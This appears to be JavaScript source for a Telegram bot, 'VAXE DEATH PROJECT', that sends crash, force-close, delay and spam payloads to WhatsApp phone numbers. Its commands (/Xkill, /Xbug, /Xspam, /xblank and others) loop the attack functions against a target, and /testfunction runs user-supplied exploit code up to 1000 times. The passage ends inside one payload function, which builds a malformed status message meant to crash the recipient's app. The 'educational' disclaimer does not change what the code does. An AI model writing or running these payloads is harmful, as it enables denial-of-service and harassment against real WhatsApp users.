<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @DitzzNotDev
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 ℵ 𝗠𝗢𝗗𝗘

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 ⌟
┊ ⓘ Ditzzy  ( Founder/Owner )
┊ ⓘ Balz  ( My Support )
┊ ⓘ Kibb  ( My Support )
┊ ⓘ Popon  ( My Support )
┊ ⓘ Aronn  ( My Support )
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});


bot.action('/murbug', async (ctx) => {
    const bugMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟧.𝟣 𝘗𝘳𝘰  
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @DitzzNotDev
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 ℵ 𝗠𝗢𝗗𝗘

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗠𝗨𝗥𝗕𝗨𝗚 𝗠𝗢𝗗𝗘 ⌟
┊✦ /Tess - Khusus Murbug
┊✦ /Xkill - Khusus Murbug
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});


bot.action('/about', async (ctx) => {
    const bugMenu = `<blockquote><tg-emoji emoji-id="5357449287707942316">🎁</tg-emoji> 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
 このスクリプトはユーザーと標的の両方にとって非常に危険なので、慎重に使用してください。

<tg-emoji emoji-id="5796440171364749940">📌</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏 
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝗩𝗔𝗫𝗘 𝗗𝗘𝗔𝗧𝗛 ℵ 𝗣𝗥𝗢𝗝𝗘𝗖𝗧
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 𝟧.𝟣 𝘗𝘳𝘰  
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @DitzzNotDev
<tg-emoji emoji-id="5280858699286471614">💎</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 ℵ 𝗠𝗢𝗗𝗘

<tg-emoji emoji-id="4936296803390718929">👾</tg-emoji> このスクリプトをご利用いただきありがとうございます。責任を持ってご使用ください。法律に基づき罰則の対象となる場合がありますので、悪用はお控えください。</blockquote>
<blockquote>──────────────────────────
#- ⌜ 𝗞𝗘𝗧𝗘𝗥𝗔𝗡𝗚𝗔𝗡 ⌟
✦ Script ini dibuat untuk tujuan 𝗲𝗱𝘂𝗰𝗮𝘁𝗶𝗼𝗻𝗮𝗹 & 𝗽𝗲𝗻𝗲𝘁𝗿𝗮𝘁𝗶𝗼𝗻 𝘁𝗲𝘀𝘁𝗶𝗻𝗴 𝗼𝗻𝗹𝘆.
Fungsinya untuk menguji keamanan struktur pesan pada WhatsApp (WA Bot)
dengan sistem payload “bug message”, spam stabil, dan exploit verifikasi
struktur JSON/Protobuf.

✦ Disclaimer :
Creator tidak bertanggung jawab atas penyalahgunaan script ini.
Gunakan untuk memberantas ripper atau scammer di whatsapp,
dan bukan untuk merusak sistem atau mengganggu pengguna lain.
© 2026 - 2027 @DitzzNotDev | All Rights Reserved
──────────────────────────</blockquote>`;

    const keyboard = [
        [
            {
                text: "𝗕𝗔𝗖𝗞 𝗠𝗘𝗡𝗨",
                callback_data: "/start", style: "primary", icon_custom_emoji_id: "5832251986635920010"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

// CASE TOOLS NYA DISINI \\
bot.command("cekemoji", async (ctx) => {
  const msg = ctx.message;
  const reply = msg.reply_to_message;

  if (!reply) {
    return ctx.reply(`
❌ Reply pesan yang berisi emoji premium.

Contoh:
- User kirim emoji premium
- Reply emoji tersebut dengan command /cekemoji
    `);
  }

  const emojis = [];

  // Ambil dari entities
  if (reply.entities) {
    reply.entities.forEach((entity) => {
      if (entity.type === "custom_emoji") {
        emojis.push({
          id: entity.custom_emoji_id
        });
      }
    });
  }

  // Ambil dari caption_entities
  if (reply.caption_entities) {
    reply.caption_entities.forEach((entity) => {
      if (entity.type === "custom_emoji") {
        emojis.push({
          id: entity.custom_emoji_id
        });
      }
    });
  }

  if (emojis.length === 0) {
    return ctx.reply(`
❌ Tidak ada custom emoji terdeteksi.

Gunakan command ini dengan reply ke pesan yang berisi emoji premium Telegram.
    `);
  }

  let result = `
<b>╔════════════════════╗
   CUSTOM EMOJI FOUND
╚════════════════════╝</b>
`;

  emojis.forEach((e, i) => {
    result += `

<b>• Emoji ${i + 1}</b>
<code>${e.id}</code>

<b>Format Pakai:</b>
<code>&lt;tg-emoji emoji-id="${e.id}"&gt;✨&lt;/tg-emoji&gt;</code>
`;
  });

  result += `

<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>Total Emoji:</b> ${emojis.length}
`;

  await ctx.reply(result, {
    parse_mode: "HTML"
  });
});
    
bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });

// CASE MURBUG DISINI \\
bot.command("Tess", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /MurbugX 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Murbug x Spam
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await jawaTimurBlankxForclsoe(target);
    await JawaTimurForcloseNew(sock, target);
    await jawaTimurCrash(target);
    await JawaTimurDelayTahanLamaxStatus(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Murbug x Spam
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("Xover", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Xbug 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>⬡═―⊱ ⎧ 𝗩𝗬𝗢𝗡𝗜𝗫 ⎭ ⊰―═⬡
⌑ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${q}
⌑ 𝚃𝚈𝙿𝙴 : Buldozer
⌑ 𝚂𝚃𝙰𝚃𝚄𝚂 : 𝘝𝘺𝘰𝘯𝘪𝘹 𝘐𝘴 𝘏𝘦𝘳𝘦𝘦..
╘═——————————————═⬡
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await VnXNewOnlyBulldo(sock, target);
    await VnXNewOnlyBulldo(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>⬡═―⊱ ⎧ 𝗩𝗬𝗢𝗡𝗜𝗫 ⎭ ⊰―═⬡
⌑ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${q}
⌑ 𝚃𝚈𝙿𝙴 : 𝘍𝘰𝘳𝘤𝘦 𝘊𝘭𝘰𝘴𝘦
⌑ 𝚂𝚃𝙰𝚃𝚄𝚂 : 𝘝𝘺𝘰𝘯𝘪𝘹 𝘐𝘴 𝘏𝘦𝘳𝘦𝘦..
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("Xkill", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /MurbugV 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Murbug Neww
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await jawaTimurBlankxForclsoe(target);
    await JawaTimurForcloseNew(sock, target);
    await jawaTimurCrash(target);
    await JawaTimurDelayTahanLamaxStatus(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Murbug Neww
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

//CASE BUG DISINI \\
bot.command("Xbug", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Xbug 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>⬡═―⊱ ⎧ 𝗩𝗬𝗢𝗡𝗜𝗫 ⎭ ⊰―═⬡
⌑ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${q}
⌑ 𝚃𝚈𝙿𝙴 : 𝘍𝘰𝘳𝘤𝘦 𝘊𝘭𝘰𝘴𝘦
⌑ 𝚂𝚃𝙰𝚃𝚄𝚂 : 𝘝𝘺𝘰𝘯𝘪𝘹 𝘐𝘴 𝘏𝘦𝘳𝘦𝘦..
╘═——————————————═⬡
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await jawaTimurBlankxForclsoe(target);
    await JawaTimurForcloseNew(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>⬡═―⊱ ⎧ 𝗩𝗬𝗢𝗡𝗜𝗫 ⎭ ⊰―═⬡
⌑ 𝚃𝙰𝚁𝙶𝙴𝚃 : ${q}
⌑ 𝚃𝚈𝙿𝙴 : 𝘍𝘰𝘳𝘤𝘦 𝘊𝘭𝘰𝘴𝘦
⌑ 𝚂𝚃𝙰𝚃𝚄𝚂 : 𝘝𝘺𝘰𝘯𝘪𝘹 𝘐𝘴 𝘏𝘦𝘳𝘦𝘦..
╘═——————————————═⬡
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("Xspam", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Xspam 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Spam To Bug
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await JawaTimurDelayTahanLamaxStatus(sock, target);
    await JawaTimurDelayTahanLamaxStatus(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Spam To Bug
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});


bot.command("xblank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xblank 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Blank x Spam
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await jawaTimurCrash(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Blank x Spam
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("117", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /HovelyV 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Vyonix x Combo
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await jawaTimurBlankxForclsoe(target);
    await jawaTimurCrash(target);
    await JawaTimurDelayTahanLamaxStatus(sock, target);
    await JawaTimurForcloseNew(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Vyonix x Combo
</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });
});

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 10 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Proses Kirim...

 ▢ Target: ${q}
 ▢ Status: Process
 ▢ Type: Unknown Exploit
</blockquote>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote>#- 𝘉 𝘜 𝘎 - 𝘚 𝘌 𝘚 𝘚 𝘐 𝘖 𝘕 𝘚
╰➤ Exploit Berhasil Terkirim...

 ▢ Target: ${q}
 ▢ Status: Success
 ▢ Type: Unknown Exploit
</blockquote>`;
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "ᯓ𝗖𝗛𝗘𝗖𝗞 ℵ 𝗧𝗔𝗥𝗚𝗘𝗧", url: `https://wa.me/${q}`, style: "success" }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  })




//FUNC AMPAS LO TARO DISINI
async function JawaTimurForcloseNew(sock, target) {
  try {
    console.log(`[FORCLOSE BY STAFF JAWA TIMUR] Processing: ${target}`);

    const generateId = () => Math.random().toString(36).substring(2, 15);

    const msg = {
      key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mimetype: "image/jpeg",
          fileSha256: Buffer.from("qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=", "base64"),
          caption: "FaiqOffc Is Here",
          fileLength: "149502",
          height: 1397,
          width: 1126,
          mediaKey: Buffer.from("5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=", "base64"),
          fileEncSha256: Buffer.from("XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=", "base64"),
          directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1777621571",
          jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true
          },
          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
          scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
          midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      statusJidList: [target],
      messageId: msg.key.id,
      participant: { jid: target },
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });
